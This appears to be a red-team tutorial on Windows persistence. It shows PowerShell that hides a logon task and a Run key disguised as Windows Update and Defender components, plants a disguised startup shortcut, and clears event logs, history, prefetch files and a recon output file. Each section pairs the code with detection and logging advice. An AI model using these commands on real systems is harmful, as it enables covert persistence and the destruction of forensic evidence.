Section 1

Scheduled Tasks for Persistence

Scheduled tasks are the most reliable persistence mechanism on Windows. They survive reboots, can run as any user or SYSTEM, and blend in with the hundreds of legitimate tasks already present on a managed workstation. Creating a task requires no elevation if you schedule it under the current user's account.

PowerShell — Create Scheduled Task (No Elevation Required) 
# Create a task that runs a PowerShell script every time the user logs on
# Task disguised as a Windows Update task
$action = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-NoP -W Hidden -Exec Bypass -File C:\Users\Public\update_helper.ps1"

$trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME

$settings = New-ScheduledTaskSettingsSet -Hidden

Register-ScheduledTask `
    -TaskName "WindowsUpdateHelper" `
    -Action $action `
    -Trigger $trigger `
    -Settings $settings `
    -Description "Manages Windows Update coordination" | Out-Null

# Verify task was created
Get-ScheduledTask -TaskName "WindowsUpdateHelper" | Select-Object TaskName,State
Defense: Detecting Malicious Scheduled Tasks
Run Get-ScheduledTask | Where-Object { $_.Principal.UserId -eq $env:USERNAME } to list all user-owned tasks. Look for tasks with -WindowStyle Hidden or -ExecutionPolicy Bypass in arguments. Sysmon Event ID 1 (process creation) logs the full command line when the task executes. WDAC policies can block unsigned scripts from running via scheduled tasks.
Section 2

Registry Run Keys

Registry run keys execute programs at user logon or system startup. The per-user key (HKCU) requires no elevation; the machine-wide key (HKLM) requires administrator rights. Both are well-known to defenders and actively monitored by EDR solutions.

PowerShell — Registry Run Key Persistence 
# Per-user run key — no elevation needed
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$payload = "powershell.exe -NoP -W Hidden -Exec Bypass -File C:\Users\Public\beacon.ps1"

Set-ItemProperty -Path $regPath -Name "WindowsDefenderSync" -Value $payload

# Verify the key was created
Get-ItemProperty -Path $regPath -Name "WindowsDefenderSync"

# Additional run key locations to know about:
# HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce         (runs once, then deletes itself)
# HKLM:\Software\Microsoft\Windows\CurrentVersion\Run             (all users, needs admin)
# HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon     (runs as SYSTEM at logon)
Defense: Monitoring Run Keys
Sysmon Event ID 13 (Registry value set) monitors all registry modifications. Configure Sysmon to alert on writes to CurrentVersion\Run* keys. Autoruns from Sysinternals (free) audits all persistence locations and flags entries not signed by Microsoft. Windows Defender ATP includes a built-in persistence audit in its Advanced Hunting queries.
Section 3

Startup Folder Drops

The Windows Startup folder is the simplest persistence method — any file placed in this directory executes at logon. It requires no PowerShell, no registry edits, and no special knowledge. LNK (shortcut) files are the most reliable format because they can execute arbitrary programs with hidden windows.

PowerShell — Startup Folder LNK Shortcut 
# Create a hidden shortcut in the user's Startup folder
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$shortcutPath = Join-Path $startupPath "SystemHealthCheck.lnk"

$wsh = New-Object -ComObject WScript.Shell
$shortcut = $wsh.CreateShortcut($shortcutPath)
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-NoP -W Hidden -Exec Bypass -File C:\Users\Public\health.ps1"
$shortcut.WindowStyle = 7   # 7 = Minimized (visually hidden)
$shortcut.IconLocation = "C:\Windows\System32\shell32.dll,13"   # Looks like a system icon
$shortcut.Save()

# Startup folder path (per-user, no elevation needed):
# %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
# All-users startup (requires admin):
# C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup

Section 5

Anti-Forensics: Clearing Evidence

After execution, responsible red teamers (and malicious actors) attempt to reduce forensic traces. Understanding these techniques is critical for Blue Team members — knowing what attackers erase tells you what to preserve with write-once logging.

PowerShell — Evidence Reduction (Authorized Testing Only) 
# Clear PowerShell command history
Clear-History
Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue

# Clear Windows Event Logs (requires elevation — triggers Security Event 1102)
wevtutil cl System
wevtutil cl Application
wevtutil cl Security

# Shred a specific file (overwrite before deletion)
$file = "C:\Users\Public\recon_output.txt"
$bytes = [System.IO.File]::ReadAllBytes($file)
[Array]::Clear($bytes, 0, $bytes.Length)
[System.IO.File]::WriteAllBytes($file, $bytes)
Remove-Item $file -Force

# Delete prefetch files for recently run executables (needs admin)
Remove-Item C:\Windows\Prefetch\POWERSHELL*.pf -Force -ErrorAction SilentlyContinue
Defender Alert — Event ID 1102

Clearing the Security event log generates Event ID 1102 ("The audit log was cleared") in the Security log itself — but only if the log has not already been cleared. Modern SIEMs forward logs in real-time to a remote collector. Clearing the local log does not erase the already-forwarded events. Anti-forensics against a properly configured SIEM is much harder than against a standalone workstation.

Defense: Write-Once Logging Strategy
Forward all Windows Event Logs to a centralized SIEM (Splunk, Microsoft Sentinel, Elastic) with a short forwarding interval (30 seconds or less). Enable PowerShell Script Block Logging (Event ID 4104) and Module Logging (Event ID 4103) via Group Policy under Computer Configuration > Administrative Templates > Windows Components > Windows PowerShell. These logs cannot be cleared from the forwarding agent — only from the SIEM itself.
